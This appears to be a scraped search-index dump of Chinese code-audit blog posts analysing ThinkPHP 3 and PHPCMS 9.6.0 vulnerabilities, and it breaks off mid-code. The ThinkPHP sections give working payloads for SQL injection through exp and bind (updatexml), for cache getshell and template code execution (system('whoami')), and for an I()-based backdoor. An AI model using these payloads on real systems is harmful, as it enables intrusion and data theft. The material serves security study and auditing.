I('GET.name'); $res = $User-\u003efield('id,username,password')-\u003ewhere(\"username='$name'\")-\u003eselect(); } } 默认情况下I方法只会对参数进行htmlspecialchars即html编码,不会进行如addslashes等操作 而在Model.class.php的where方法中,在parse没有设置的情况下,不会进行escapeString操作 /** * 指定查询条件 支持安全过滤 * @access public * @param mixed $where 条件表达式 * @param mixed $parse 预处理参数 * @return Model */ public function where($where,$parse=null){ if(!is_null($parse) \u0026\u0026 is_string($where)) { if(!is_array($parse)) { $parse = func_get_args(); array_shift($parse); } $parse = array_map(array($this-\u003edb,'escapeString'),$parse);//addslashes $where = vsprintf($where,$parse); }elseif(is_object($where)){ $where = get_object_vars($where); } if(is_string($where) \u0026\u0026 '' != $where){ $map = array(); $map['_string'] = $where; $where = $map; } if(isset($this-\u003eoptions['where'])){ $this-\u003eoptions['where'] = array_merge($this-\u003eoptions['where'],$where); }else{ $this-\u003eoptions['where'] = $where; } return $this; } \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User = M(\"user\"); $name = I('GET.name'); $res = $User-\u003efield('id,username,password')-\u003ewhere(\"username='%s'\",$name)-\u003eselect(); } } 还可以使用array(\"username\"=\u003e$name)进行传参,在$this-\u003eparseWhere(!empty($options['where'])?$options['where']:''),进行参数处理并进行escapeString操作,具体流程如下 #ThinkPHP/Library/Think/Model.class.php //$this-\u003eoptions['where'] = $where; public function select($options=array()) { $options = $this-\u003e_parseOptions($options);//$this-\u003eoptions 转化为 $options ... $resultSet = $this-\u003edb-\u003eselect($options); ... } #ThinkPHP/Library/Think/Db/Driver.class.php public function select($options=array()) { $this-\u003emodel = $options['model']; $this-\u003eparseBind(!empty($options['bind'])?$options['bind']:array()); $sql = $this-\u003ebuildSelectSql($options); $result = $this-\u003equery($sql,!empty($options['fetch_sql']) ? true : false); return $result; } public function buildSelectSql($options=array()) { ... $sql = $this-\u003eparseSql($this-\u003eselectSql,$options); } /** * 替换SQL语句中表达式 * @access public * @param array $options 表达式 * @return string */ public function parseSql($sql,$options=array()){ $sql = str_replace( array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'), array( $this-\u003eparseTable($options['table']), $this-\u003eparseDistinct(isset($options['distinct'])?$options['distinct']:false), $this-\u003eparseField(!empty($options['field'])?$options['field']:'*'), $this-\u003eparseJoin(!empty($options['join'])?$options['join']:''), $this-\u003eparseWhere(!empty($options['where'])?$options['where']:''),//对where语句进行分析 $this-\u003eparseGroup(!empty($options['group'])?$options['group']:''), $this-\u003eparseHaving(!empty($options['having'])?$options['having']:''), $this-\u003eparseOrder(!empty($options['order'])?$options['order']:''), $this-\u003eparseLimit(!empty($options['limit'])?$options['limit']:''), $this-\u003eparseUnion(!empty($options['union'])?$options['union']:''), $this-\u003eparseLock(isset($options['lock'])?$options['lock']:false), $this-\u003eparseComment(!empty($options['comment'])?$options['comment']:''), $this-\u003eparseForce(!empty($options['force'])?$options['force']:'') ),$sql); return $sql; } protected function parseWhere($where) { foreach ($where as $key=\u003e$val){ if(0===strpos($key,'_')) { // 解析特殊条件表达式 $whereStr .= $this-\u003eparseThinkWhere($key,$val);//查询条件判断 } else{ // 查询字段的安全过滤 $multi = is_array($val) \u0026\u0026 isset($val['_multi']); $key = trim($key); ... $whereStr .= $this-\u003eparseWhereItem($this-\u003eparseKey($key),$val);//parseWhereItem where子单元分析 / parseKey 字段和表名处理 column_name -\u003e `column_name` } } protected function parseWhereItem($key,$val) { $whereStr = ''; if(is_array($val)) { if(is_string($val[0])) { $exp = strtolower($val[0]); if(preg_match('/^(eq|neq|gt|egt|lt|elt)$/',$exp)) { // 比较运算 ...$this-\u003eparseValue(","date":"2022-03-21","objectID":"/thinkphp_v3/:5:1","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"bind注入 前面提到在ThinkPHP/Library/Think/Db/Driver.class.php的parseWhereItem函数中,满足某些条件时可以绕过parseValue的addslashes处理 elseif('bind' == $exp ){ // 使用表达式 $whereStr .= $key.' = :'.$val[1]; # !!! 可能存在利用点,因为没有进行parseValue }elseif('exp' == $exp ){ // 使用表达式 $whereStr .= $key.' '.$val[1]; # !!! 可能存在利用点,因为没有进行parseValue } ... $count = count($val); $rule = isset($val[$count-1]) ? (is_array($val[$count-1]) ? strtoupper($val[$count-1][0]) : strtoupper($val[$count-1]) ) : '' ; if(in_array($rule,array('AND','OR','XOR'))) { $count = $count -1; }else{ $rule = 'AND'; } for($i=0;$i\u003c$count;$i++) { $data = is_array($val[$i])?$val[$i][1]:$val[$i]; if('exp'==strtolower($val[$i][0])) { $whereStr .= $key.' '.$data.' '.$rule.' '; # !!! 可能存在利用点,因为没有进行parseValue } } 传入name[]=exp或者name[][]=exp,debug时会发现字符串exp会在后面增加一个空格 原因在于前面提到的I的方法的特殊处理,在I方法的最后调用了think_filter这一过滤函数,在敏感词的后面加了一个空格 这里有两种处理方法 不使用I方法获取参数,直接使用$_GET进行获取 $name = $_GET['name']; name[]=exp\u0026name[]==1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1) 绕过think_filter限制 注意到在parseWhereItem函数是会对bind进行特殊处理的,但是think_filter没有对bind进行过滤,由此当name[]=bind时,可以将数据 is_array($data) \u0026\u0026 array_walk_recursive($data,'think_filter'); return $data; } function think_filter(\u0026$value){ // TODO 其他安全过滤 // 过滤查询特殊字符 if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){ $value .= ' '; } } 最终得到的wherestr为 `username` = :asdf 由于=:的存在,这玩意用来引用绑定变量,我们要消除:对于sql语句的影响 使用save方法 thinkphp将update操作封装在save方法中 \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User = M(\"user\"); $name = I('GET.name'); $data['password'] = '123456'; $res = $User-\u003ewhere(array('username'=\u003e$name))-\u003esave($data); } } name[]=bind\u0026name[]=0 and updatexml(1,concat(0x7e,(select @@version),0x7e),1) save方法同样会调用parseWhere并进入到parseWhereItem中 #ThinkPHP/Library/Think/Model.class.php public function save($data='',$options=array()) { ... if(is_array($options['where']) \u0026\u0026 isset($options['where'][$pk])){ $pkValue = $options['where'][$pk]; } if(false === $this-\u003e_before_update($data,$options)) { return false; } $result = $this-\u003edb-\u003eupdate($data,$options); if(false !== $result \u0026\u0026 is_numeric($result)) { if(isset($pkValue)) $data[$pk] = $pkValue; $this-\u003e_after_update($data,$options); } return $result; } #ThinkPHP/Library/Think/Db/Driver.class.php public function update($data,$options) { $this-\u003emodel = $options['model']; $this-\u003eparseBind(!empty($options['bind'])?$options['bind']:array()); $table = $this-\u003eparseTable($options['table']); $sql = 'UPDATE ' . $table . $this-\u003eparseSet($data); //关键点1 if(strpos($table,',')){// 多表更新支持JOIN操作 $sql .= $this-\u003eparseJoin(!empty($options['join'])?$options['join']:''); } $sql .= $this-\u003eparseWhere(!empty($options['where'])?$options['where']:'');//关键点2 if(!strpos($table,',')){ // 单表更新支持order和lmit $sql .= $this-\u003eparseOrder(!empty($options['order'])?$options['order']:'').$this-\u003eparseLimit(!empty($options['limit'])?$options['limit']:''); } $sql .= $this-\u003eparseComment(!empty($options['comment'])?$options['comment']:''); return $this-\u003eexecute($sql,!empty($options['fetch_sql']) ? true : false);//关键点3 } 首先在parseSet对=:进行解析 #ThinkPHP/Library/Think/Db/Driver.class.php protected function parseSet($data) { foreach ($data as $key=\u003e$val){ if(is_array($val) \u0026\u0026 'exp' == $val[0]){ $set[] = $this-\u003eparseKey($key).'='.$val[1]; }elseif(is_null($val)){ $set[] = $this-\u003eparseKey($key).'=NULL'; }elseif(is_scalar($val)) {// 过滤非标量数据 if(0===strpos($val,':') \u0026\u0026 in_array($val,array_keys($this-\u003ebind)) ){ $set[] = $this-\u003eparseKey($key).'='.$this-\u003eescapeString($val); }else{ $name = count($this-\u003ebind); $set[] = $this-\u003eparseKey($key).'=:'.$name; $this-\u003ebindParam($name,$val); } } } return ' SET '.implode(',',$set); } #ThinkPHP/Library/Think/Db/Driver.class.php protected function bindParam($name,$value){ $this-\u003ebind[':'.$name] = $value; } 然后进行parseWhereItem操作 此时wherestr的值为 `username` = :0 and updatexml(1,concat(0x7e,(select @@version),0x7e),1) 在返回到parseWhere后得到的wh","date":"2022-03-21","objectID":"/thinkphp_v3/:5:2","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"find() select() delete()注入 find() select() delete()这三个函数的参数中均有$options,且在满足一定条件时可以直接拼接到sql语句中 /** * 查询数据 * @access public * @param mixed $options 表达式参数 * @return mixed */ public function find($options=array()) { ... // 总是查找一条记录 $options['limit'] = 1; // 分析表达式 $options = $this-\u003e_parseOptions($options);//$options可控并传递到$this-\u003edb-\u003eselect中 ... $resultSet = $this-\u003edb-\u003eselect($options);//跟前面的分析过程一样,进入parseWhere,同时因为$options['where']是字符串,所以直接进行拼接并返回,最终传入到$this-\u003edb-\u003equery中 ... } /** * 查询数据集 * @access public * @param array $options 表达式参数 * @return mixed */ public function select($options=array()) {//利用方法同find() ... // 分析表达式 $options = $this-\u003e_parseOptions($options); ... $resultSet = $this-\u003edb-\u003eselect($options); ... } /** * 删除数据 * @access public * @param mixed $options 表达式 * @return mixed */ public function delete($options=array()) { ... // 分析表达式 $options = $this-\u003e_parseOptions($options); if(is_array($options['where']) \u0026\u0026 isset($options['where'][$pk])){ $pkValue = $options['where'][$pk]; } if(false === $this-\u003e_before_delete($options)) { return false; } $result = $this-\u003edb-\u003edelete($options); ... } protected function _parseOptions($options=array()) {//当$options['where']是字符串时,直接返回 if(is_array($options)) $options = array_merge($this-\u003eoptions,$options); // 字段类型验证 if(isset($options['where']) \u0026\u0026 is_array($options['where']) \u0026\u0026 !empty($fields) \u0026\u0026 !isset($options['join'])) { // 对数组查询条件进行字段类型检查 ... } return $options; } public function select($options=array()) { $this-\u003emodel = $options['model']; $this-\u003eparseBind(!empty($options['bind'])?$options['bind']:array()); $sql = $this-\u003ebuildSelectSql($options); $result = $this-\u003equery($sql,!empty($options['fetch_sql']) ? true : false); return $result; } public function buildSelectSql($options=array()) { ... $sql = $this-\u003eparseSql($this-\u003eselectSql,$options); return $sql; } public function parseSql($sql,$options=array()){ $sql = str_replace( array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'), array( ... $this-\u003eparseWhere(!empty($options['where'])?$options['where']:''), ... ),$sql); return $sql; } protected function parseWhere($where) { $whereStr = ''; if(is_string($where)) { // 直接使用字符串条件 $whereStr = $where; } return empty($whereStr)?'':' WHERE '.$whereStr; } public function delete($options=array()) { $this-\u003emodel = $options['model']; $this-\u003eparseBind(!empty($options['bind'])?$options['bind']:array()); $table = $this-\u003eparseTable($options['table']); $sql = 'DELETE FROM '.$table; if(strpos($table,',')){// 多表删除支持USING和JOIN操作 if(!empty($options['using'])){ $sql .= ' USING '.$this-\u003eparseTable($options['using']).' '; } $sql .= $this-\u003eparseJoin(!empty($options['join'])?$options['join']:''); } $sql .= $this-\u003eparseWhere(!empty($options['where'])?$options['where']:''); if(!strpos($table,',')){ // 单表删除支持order和limit $sql .= $this-\u003eparseOrder(!empty($options['order'])?$options['order']:'') .$this-\u003eparseLimit(!empty($options['limit'])?$options['limit']:''); } $sql .= $this-\u003eparseComment(!empty($options['comment'])?$options['comment']:''); return $this-\u003eexecute($sql,!empty($options['fetch_sql']) ? true : false); } find() \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User = M(\"user\"); // 实例化User对象 $name = I('GET.name'); $User-\u003efind($name); } } name[where]=updatexml(1,concat(0x7e,(select @@version),0x7e),1)%23 select() \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User = M(\"user\"); // 实例化User对象 $name = I('GET.name'); $User-\u003eselect($name); } } delete() \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User = M(\"user\"); // 实例化User对象 $name = I('GET.name'); $User-\u003edelete($name); } } ","date":"2022-03-21","objectID":"/thinkphp_v3/:5:3","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"order by注入 \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User = M(\"user\"); // 实例化User对象 $order = I('GET.order'); $res = $User-\u003eorder($order)-\u003efind(); } } thinkphp通过__call方法实现特殊方法 /** * 利用__call方法实现一些特殊的Model方法 * @access public * @param string $method 方法名称 * @param array $args 调用参数 * @return mixed */ public function __call($method,$args) { if(in_array(strtolower($method),$this-\u003emethods,true)) { // 连贯操作的实现 $this-\u003eoptions[strtolower($method)] = $args[0]; return $this; } ... } $args[0]没有经过任何过滤就被传入到$this-\u003eoptions['order']中,而同样在parseOrder中没有经过任何过滤就拼接到sql语句中 protected function parseOrder($order) { if(is_array($order)) { $array = array(); foreach ($order as $key=\u003e$val){ if(is_numeric($key)) { $array[] = $this-\u003eparseKey($val); }else{ $array[] = $this-\u003eparseKey($key).' '.$val; } } $order = implode(',',$array); } return !empty($order)? ' ORDER BY '.$order:''; } 接下来的利用方法就跟前面提到的find()注入差不多 ","date":"2022-03-21","objectID":"/thinkphp_v3/:5:4","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"group注入 \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User = M(\"user\"); // 实例化User对象 $group = I('GET.group'); $res = $User-\u003egroup($group)-\u003efind(); } } protected function parseGroup($group) { return !empty($group)? ' GROUP BY '.$group:''; } 利用方法同上 ","date":"2022-03-21","objectID":"/thinkphp_v3/:5:5","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"having注入 \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User = M(\"user\"); // 实例化User对象 $having = I('GET.having'); $res = $User-\u003ehaving($having)-\u003efind(); } } protected function parseHaving($having) { return !empty($having)? ' HAVING '.$having:''; } 利用方法同上 ","date":"2022-03-21","objectID":"/thinkphp_v3/:5:6","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"count sum min max avg注入 \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $User = M(\"user\"); // 实例化User对象 $count = I('GET.count'); $res = $User-\u003ecount($count); } } /** * 聚合查询 * @access public * @param string $aggregate 聚合方法 * @param string $field 字段名 * @param bool $force 强制转为数字类型 * @return mixed */ public function aggregate($aggregate, $field, $force = false) { if (!preg_match('/^[\\w\\.\\*]+$/', $field)) { throw new Exception('not support data:' . $field); } $result = $this-\u003evalue($aggregate . '(' . $field . ') AS tp_' . strtolower($aggregate), 0, $force); return $result; } /** * COUNT查询 * @access public * @param string $field 字段名 * @return integer|string */ public function count($field = '*') { if (isset($this-\u003eoptions['group'])) { if (!preg_match('/^[\\w\\.\\*]+$/', $field)) { throw new Exception('not support data:' . $field); } // 支持GROUP $options = $this-\u003egetOptions(); $subSql = $this-\u003eoptions($options)-\u003efield('count(' . $field . ')')-\u003ebind($this-\u003ebind)-\u003ebuildSql(); $count = $this-\u003etable([$subSql =\u003e '_group_count_'])-\u003evalue('COUNT(*) AS tp_count', 0); } else { $count = $this-\u003eaggregate('COUNT', $field); } return is_string($count) ? $count : (int) $count; } /** * SUM查询 * @access public * @param string $field 字段名 * @return float|int */ public function sum($field) { return $this-\u003eaggregate('SUM', $field, true); } /** * MIN查询 * @access public * @param string $field 字段名 * @param bool $force 强制转为数字类型 * @return mixed */ public function min($field, $force = true) { return $this-\u003eaggregate('MIN', $field, $force); } /** * MAX查询 * @access public * @param string $field 字段名 * @param bool $force 强制转为数字类型 * @return mixed */ public function max($field, $force = true) { return $this-\u003eaggregate('MAX', $field, $force); } /** * AVG查询 * @access public * @param string $field 字段名 * @return float|int */ public function avg($field) { return $this-\u003eaggregate('AVG', $field, true); } 没有经过过滤就拼接到sql语句中 除此之外还有不少sql注入同样是由于开发者错误的将用户传入的参数传递给thinkphp 水文-Thinkphp3.2.3安全开发须知 ","date":"2022-03-21","objectID":"/thinkphp_v3/:5:7","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"缓存getshell \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $shell = I('GET.shell'); S('shell',$shell); } } #ThinkPHP/Common/functions.php function S($name,$value='',$options=null) { static $cache = ''; ... }elseif(empty($cache)) { // 自动初始化 $cache = Think\\Cache::getInstance(); } ... else { // 缓存数据 if(is_array($options)) { $expire = isset($options['expire'])?$options['expire']:NULL; }else{ $expire = is_numeric($options)?$options:NULL; } return $cache-\u003eset($name, $value, $expire);// } } #ThinkPHP/Library/Think/Cache/Driver/File.class.php //class File extends Cache public function set($name,$value,$expire=null) { ... $filename = $this-\u003efilename($name); $data = serialize($value); if( C('DATA_CACHE_COMPRESS') \u0026\u0026 function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data,3); } $data = \"\u003c?php\\n//\".sprintf('%012d',$expire).$check.$data.\"\\n?\u003e\"; $result = file_put_contents($filename,$data); ... } private function filename($name) { $name = md5(C('DATA_CACHE_KEY').$name); ... else{ $filename = $this-\u003eoptions['prefix'].$name.'.php'; } return $this-\u003eoptions['temp'].$filename; } 文件名是$name的md5 写入的数据经过了序列化 最终文件路径为./Application/Runtime/Temp/2591c98b70119fe624898b1e424b5e91.php \u003c?php //000000000000s:4:\"asdf\"; ?\u003e 传入shell=%0aphpinfo();// \u003c?php //000000000000s:13:\" phpinfo();//\"; ?\u003e ","date":"2022-03-21","objectID":"/thinkphp_v3/:6:0","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"特殊情况下造成命令执行 $this-\u003eshow和$this-\u003edisplay \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $info = I('GET.info'); $this-\u003eshow($info); $this-\u003edisplay('','','',$info); $info = I('GET.info','','');#没有对\u003c和\u003e进行转义 $this-\u003eshow($info); $this-\u003edisplay('','','',$info); } } info=\u003c?php system('whoami');?\u003e 在Application/Runtime/Cache/Home会生成对应的模板文件 $this-\u003efetch \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $info = I('GET.info'); $template=$this-\u003efetch('',$info); var_dump($template); $info = I('GET.info','','');#没有对\u003c和\u003e进行转义 $template=$this-\u003efetch('',$info); var_dump($template); } } info=\u003c?php system('whoami');?\u003e 在Application/Runtime/Cache/Home会生成对应的模板文件 利用I函数留下后门 \u003c?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ I('POST.info','',I('GET.info')); } } ","date":"2022-03-21","objectID":"/thinkphp_v3/:7:0","tags":null,"title":"ThinkPHP_V3","uri":"/thinkphp_v3/"},{"categories":["代码审计"],"content":"参考链接 PHPcms 9.6.0漏洞审计 ","date":"2022-03-14","objectID":"/phpcms_v9.6.0/:0:0","tags":null,"title":"PHPCMS_V9.6.0","uri":"/phpcms_v9.6.0/"},{"categories":["代码审计"],"content":"cms组成 index.php作为整个cms的入口(包括后台) \u003c?php /** * index.php PHPCMS 入口 * * @copyright (C) 2005-2010 PHPCMS * @license http://www.phpcms.cn/license/ * @lastmodify 2010-6-1 */ //PHPCMS根目录 define('PHPCMS_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR); include PHPCMS_PATH.'/phpcms/base.php'; pc_base::creat_app(); ?\u003e 首先对phpcms/base.php进行包含,base.php是PHPCMS框架入口文件 定义了大量的常量,例如PHPCMS框架路径 加载公用函数库 pc_base::load_sys_func('global');//phpcms/libs/functions/global.func.php pc_base::load_sys_func('extention'); pc_base::auto_load_func(); 加载了对字符串或数组进行处理的函数如addslashes,safe_replace(’\u003e‘替换从’\u0026gt’),remove_xss(xss过滤) 提供了pc_base类对应用进行初始化(主要使用静态方法实现) pc_base::creat_app(); public static function creat_app() { return self::load_sys_class('application'); } /** * 加载系统类方法 * @param string $classname 类名 * @param string $path 扩展地址 * @param intger $initialize 是否初始化 */ public static function load_sys_class($classname, $path = '', $initialize = 1) { return self::_load_class($classname, $path, $initialize); } /** * 加载类文件函数 * @param string $classname 类名 * @param string $path 扩展地址 * @param intger $initialize 是否初始化 */ private static function _load_class($classname, $path = '', $initialize = 1) { static $classes = array(); if (empty($path)) $path = 'libs' . DIRECTORY_SEPARATOR . 'classes'; $key = md5($path . $classname); if (isset($classes[$key])) { if (!empty($classes[$key])) { return $classes[$key]; } else { return true; } } if (file_exists(PC_PATH . $path . DIRECTORY_SEPARATOR . $classname . '.class.php')) { include PC_PATH . $path . DIRECTORY_SEPARATOR . $classname . '.class.php'; $name = $classname; if ($my_path = self::my_path(PC_PATH . $path . DIRECTORY_SEPARATOR . $classname . '.class.php')) { include $my_path; $name = 'MY_' . $classname; } if ($initialize) { $classes[$key] = new $name; } else { $classes[$key] = true; } return $classes[$key]; } else { return false; } } 对phpcms/libs/classes/application.class.php进行包含并且通过$classes[$key] = new $name;对application类进行实例化 application实例化时会调用构造函数__construct public function __construct() { $param = pc_base::load_sys_class('param'); define('ROUTE_M', $param-\u003eroute_m()); define('ROUTE_C', $param-\u003eroute_c()); define('ROUTE_A', $param-\u003eroute_a()); $this-\u003einit(); } private function init() { $controller = $this-\u003eload_controller(); if (method_exists($controller, ROUTE_A)) { if (preg_match('/^[_]/i', ROUTE_A)) { exit('You are visiting the action is to protect the private action'); } else { call_user_func(array($controller, ROUTE_A)); } } else { exit('Action does not exist.'); } } private function load_controller($filename = '', $m = '') { if (empty($filename)) $filename = ROUTE_C; if (empty($m)) $m = ROUTE_M; $filepath = PC_PATH . 'modules' . DIRECTORY_SEPARATOR . $m . DIRECTORY_SEPARATOR . $filename . '.php'; if (file_exists($filepath)) { $classname = $filename; include $filepath; if ($mypath = pc_base::my_path($filepath)) { $classname = 'MY_' . $filename; include $mypath; } if (class_exists($classname)) { return new $classname; } else { exit('Controller does not exist.'); } } else { exit('Controller does not exist.'); } } 首先是对param类进行实例化,param.class.php是参数处理类,param类进行实例化时会调用构造函数__construct public function __construct() { if (!get_magic_quotes_gpc()) { $_POST = new_addslashes($_POST); $_GET = new_addslashes($_GET); $_REQUEST = new_addslashes($_REQUEST); $_COOKIE = new_addslashes($_COOKIE); } $this-\u003eroute_config = pc_base::load_config('route', SITE_URL) ? pc_base::load_config('route', SITE_URL) : pc_base::load_config('route', 'default'); if (isset($this-\u003eroute_config['data']['POST']) \u0026\u0026 is_array($this-\u003eroute_config['data']['POST'])) { foreach ($this-\u003eroute_config['data']['POST'] as $_key =\u003e $_value) { if (!isset($_POST[$_key])) $_POST[$_key] = $_value; } } if (isset($this-\u003eroute_config['data']['GET']) \u0026\u0026 is_array($this-\u003eroute_config['data']['GET'])) { foreach ($this-\u003eroute_config['data']['GET'] as $_key =\u003e $_value) { if (!isset($_GET[$_key])) $_GET[$_key] = $_value; } } if (isset($_GET['page'])) { $_GET['page'] = max(intval($_GET['page']),","date":"2022-03-14","objectID":"/phpcms_v9.6.0/:1:0","tags":null,"title":"PHPCMS_V9.6.0","uri":"/phpcms_v9.6.0/"},{"categories":["代码审计"],"content":"phpcms/modules/content/down.php存在SQL注入漏洞 class down { private $db; function __construct() { $this-\u003edb = pc_base::load_model('content_model'); } public function init() { $a_k = trim($_GET['a_k']); if (!isset($a_k)) showmessage(L('illegal_parameters')); $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system', 'auth_key')); if (empty($a_k)) showmessage(L('illegal_parameters')); unset($i, $m, $f); parse_str($a_k); if (isset($i)) $i = $id = intval($i); if (!isset($m)) showmessage(L('illegal_parameters')); if (!isset($modelid) || !isset($catid)) showmessage(L('illegal_parameters')); if (empty($f)) showmessage(L('url_invalid')); $allow_visitor = 1; $MODEL = getcache('model', 'commons'); $tablename = $this-\u003edb-\u003etable_name = $this-\u003edb-\u003edb_tablepre . $MODEL[$modelid]['tablename']; $this-\u003edb-\u003etable_name = $tablename . '_data'; $rs = $this-\u003edb-\u003eget_one(array('id' =\u003e $id)); $siteids = getcache('category_content', 'commons'); $siteid = $siteids[$catid]; $CATEGORYS = getcache('category_content_' . $siteid, 'commons'); $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system', 'auth_key'));说明$a_k来源于某个字符串的解密结果,因此可以绕过new_addslashes 注意到parse_str($a_k);存在变量覆盖漏洞,利用该漏洞绕过if (isset($i)) $i = $id = intval($i);并且覆盖$id即可利用$rs = $this-\u003edb-\u003eget_one(array('id' =\u003e $id));进行sql注入 但是要想利用sys_auth解密字符串就必须先构造出一个能够正常解密且包含注入语句的字符串,有两种途径 获取pc_base::load_config('system', 'auth_key'),auth_key是cms安装时随机生成的,获取难度较大 像前面审计dedecms那样,将包含注入语句的字符串传递给cms再通过类似GetCookie的手段将其读取 function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) { $ckey_length = 4; $key = md5($key != '' ? $key : pc_base::load_config('system', 'auth_key')); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya . md5($keya . $keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string; $string_length = strlen($string); $result = ''; $box = range(0, 255); .../*盒变换*/ if ($operation == 'DECODE') { if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() \u003e 0) \u0026\u0026 substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc . rtrim(strtr(base64_encode($result), '+/', '-_'), '='); } } 全局查找sys_auth的引用,在phpcms\\phpcms\\libs\\classes\\param.class.php中看到调用了setcookie并将加密后的值代入cookie中 public static function set_cookie($var, $value = '', $time = 0) { $time = $time \u003e 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0); $s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0; $var = pc_base::load_config('system', 'cookie_pre') . $var; $_COOKIE[$var] = $value; if (is_array($value)) { foreach ($value as $k =\u003e $v) { setcookie($var . '[' . $k . ']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system', 'cookie_path'), pc_base::load_config('system', 'cookie_domain'), $s); } } else { setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system', 'cookie_path'), pc_base::load_config('system', 'cookie_domain'), $s); } } 全局查找param::set_cookie的引用,在phpcms/modules/attachment/attachments.php中的swfupload_json调用了param::set_cookie且$json_str为可控参数 function __construct() { pc_base::load_app_func('global'); $this-\u003eupload_url = pc_base::load_config('system', 'upload_url'); $this-\u003eupload_path = pc_base::load_config('system', 'upload_path'); $this-\u003eimgext = array('jpg', 'gif', 'png', 'bmp', 'jpeg'); $this-\u003euserid = $_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'], 'DECODE')); $this-\u003eisadmin = $this-\u003eadmin_username = $_SESSION['roleid'] ? 1 : 0; $this-\u003egroupid = param::get_cookie('_groupid') ? param::get_cookie('_groupid') : 8; //判断是否登录 if (empty($this-\u003euserid)) { showmessage(L('please_login', '","date":"2022-03-14","objectID":"/phpcms_v9.6.0/:2:0","tags":null,"title":"PHPCMS_V9.6.0","uri":"/phpcms_v9.6.0/"},{"categories":["代码审计"],"content":"phpcms/modules/member/index.php存在任意文件上传漏洞 在register函数中有以下功能 if ($member_setting['choosemodel']) { require_once CACHE_MODEL_PATH . 'member_input.class.php'; require_once CACHE_MODEL_PATH . 'member_update.class.php'; $member_input = new member_input($userinfo['modelid']); $_POST['info'] = array_map('new_html_special_chars', $_POST['info']); $user_model_info = $member_input-\u003eget($_POST['info']); } 到达这一功能点需要构造数据 http://192.168.241.130:8080/index.php?m=member\u0026c=index\u0026a=register\u0026siteid=1 POST: dosubmit=1\u0026username=123\u0026nickname=123\u0026email=a@a.com\u0026password=123456\u0026modelid=123 这里首先对member_update.class.php和member_input.class.php进行包含,然后实例化了一个member_input类,然后调用了member_input类中的get方法 注意这里选择的是caches目录下的member_input.class.php function get($data) { $this-\u003edata = $data = trim_script($data); $model_cache = getcache('member_model', 'commons'); $this-\u003edb-\u003etable_name = $this-\u003edb_pre . $model_cache[$this-\u003emodelid]['tablename']; $info = array(); $debar_filed = array('catid', 'title', 'style', 'thumb', 'status', 'islink', 'description'); if (is_array($data)) { foreach ($data as $field =\u003e $value) { if ($data['islink'] == 1 \u0026\u0026 !in_array($field, $debar_filed)) continue; $field = safe_replace($field); $name = $this-\u003efields[$field]['name']; $minlength = $this-\u003efields[$field]['minlength']; $maxlength = $this-\u003efields[$field]['maxlength']; $pattern = $this-\u003efields[$field]['pattern']; $errortips = $this-\u003efields[$field]['errortips']; if (empty($errortips)) $errortips = \"$name 不符合要求！\"; $length = empty($value) ? 0 : strlen($value); if ($minlength \u0026\u0026 $length \u003c $minlength \u0026\u0026 !$isimport) showmessage(\"$name 不得少于 $minlength 个字符！\"); if (!array_key_exists($field, 